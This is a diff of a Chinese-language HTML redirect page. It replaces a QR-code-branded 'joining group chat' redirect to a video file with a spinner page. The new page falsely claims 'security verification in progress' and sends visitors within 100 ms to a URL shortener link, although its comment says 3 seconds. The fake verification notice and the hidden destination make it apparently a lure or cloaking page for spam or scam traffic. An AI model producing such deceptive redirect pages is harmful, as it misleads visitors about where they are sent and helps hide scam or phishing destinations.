@@ -1,222 +1,82 @@
+
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
-	<title>草料二维码</title>
-	<style type="text/css">
-		html {
-			color: #000;
-			background: #FFF
-		}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>加载中·····</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
 
-		body,
-		div,
-		dl,
-		dt,
-		dd,
-		ul,
-		ol,
-		li,
-		h1,
-		h2,
-		h3,
-		h4,
-		h5,
-		h6,
-		pre,
-		code,
-		form,
-		fieldset,
-		legend,
-		input,
-		textarea,
-		p,
-		blockquote,
-		th,
-		td {
-			margin: 0;
-			padding: 0
-		}
+        body {
+            background: linear-gradient(135deg, #ff3366, #ff6666);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
 
-		table {
-			border-collapse: collapse;
-			border-spacing: 0
-		}
+        .container {
+            text-align: center;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
 
-		fieldset,
-		img {
-			border: 0
-		}
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
 
-		address,
-		caption,
-		cite,
-		code,
-		dfn,
-		em,
-		strong,
-		th,
-		var {
-			font-style: normal;
-			font-weight: normal
-		}
+        h1 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
 
-		ol,
-		ul {
-			list-style: none
-		}
+        .tip {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+        }
 
-		caption,
-		th {
-			text-align: left
-		}
-
-		h1,
-		h2,
-		h3,
-		h4,
-		h5,
-		h6 {
-			font-size: 100%;
-			font-weight: normal
-		}
-
-		q:before,
-		q:after {
-			content: ''
-		}
-
-		abbr,
-		acronym {
-			border: 0;
-			font-variant: normal
-		}
-
-		sup {
-			vertical-align: text-top
-		}
-
-		sub {
-			vertical-align: text-bottom
-		}
-
-		input,
-		textarea,
-		select {
-			font-family: inherit;
-			font-size: inherit;
-			font-weight: inherit;
-			*font-size: 100%
-		}
-
-		legend {
-			color: #000
-		}
-
-		.wrapper .image img {
-			display: block;
-			margin: 0 auto;
-			max-width: 100%;
-		}
-
-		.wrapper h1 {
-			font-size: 20px;
-			font-weight: bold;
-			padding: 20px;
-			text-align: center;
-		}
-
-		.wrapper .content h1 {
-			padding: 0 0 10px 0;
-		}
-
-		.wrapper .content {
-			padding: 20px 15px;
-		}
-
-		.wrapper .content p {
-			margin: 0 0 15px;
-			line-height: 26px;
-		}
-
-		.wrapper .content img {
-			max-width: 100%;
-			height: auto;
-		}
-
-		.mod-link {
-			padding-top: 50px;
-			width: 100%;
-			line-height: 24px;
-			text-align: center;
-			font-size: 16px;
-			color: #333;
-		}
-
-		.mod-link p {
-			color: #999;
-		}
-
-		.mod-link .text {
-			padding: 10px;
-			margin: 10px 10px 40px;
-			line-height: 1.2;
-			color: #333;
-			word-wrap: break-word;
-			word-break: break-all;
-			text-align: center;
-			background: #f2f2f2;
-		}
-
-		.mod-link .safe {
-			margin-bottom: 8px;
-		}
-
-		.mod-link .text span {
-			overflow: hidden;
-			text-overflow: ellipsis;
-			display: -webkit-box;
-			-webkit-line-clamp: 3;
-			-webkit-box-orient: vertical;
-		}
-
-		.mod-link a {
-			text-decoration: none;
-		}
-
-		.mod-link .btn {
-			display: block;
-			width: 70%;
-			height: 40px;
-			line-height: 40px;
-			color: #FFF;
-			text-align: center;
-			border-radius: 4px;
-			color: #56a848;
-			border: 1px solid #56a848;
-			margin: 0 auto;
-		}
-	</style>
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-
 <body>
-	<div class="wrapper">
-		<div class="content">
-			<h1>加入群聊，正在转跳·····</h1>
+    <div class="container">
+        <div class="loader"></div>
+        <h1>精彩内容马上呈现...</h1>
+        <p class="tip">正在安全验证中，请勿关闭页面</p>
+    </div>
 
+    <script>
+        // 3秒后跳转到指定页面‌:ml-citation{ref="3" data="citationList"}
+        setTimeout(() => {
+            window.location.href = "https://dwz.cn/SqRyVYWU";
+        }, 100);
 
-			<script>
-				function changeurl(){
-var arr = new Array(
-"http://bj.bcebos.com/zuojiao/videoworks/console-upload/2-Q4-08-495482.mp4",
-);
-window.location.href = arr[Math.floor(Math.random() * arr.length)];
-}
-changeurl(); 
-			</script>
-
-
-
+        // 抖音风格背景动画
+        const colors = ['#ff3366', '#ff6666', '#ff9966', '#ffcc66'];
+        let index = 0;
+        setInterval(() => {
+            document.body.style.background = `linear-gradient(135deg, ${colors[index]}, ${colors[(index+1)%4]})`;
+            index = (index + 1) % 4;
+        }, 1000);
+    </script>
+</body>
 </html>
